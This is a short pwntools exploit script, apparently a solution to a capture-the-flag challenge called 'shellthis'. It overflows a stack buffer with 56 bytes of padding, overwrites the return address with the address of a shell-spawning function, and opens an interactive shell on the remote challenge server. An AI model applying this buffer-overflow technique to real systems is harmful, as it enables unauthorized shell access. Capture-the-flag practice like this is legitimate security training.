from pwn import *

#pro = process('./shellthis')
pro = remote('chal.duc.tf' ,30002)

print(pro.recv())
offset= 56
get_shell = p64(0x0000000004006ca)

padding = "A"*offset
payload = padding
payload += get_shell
print(payload)
pro.send(payload)
#print(pro.recv())
pro.interactive()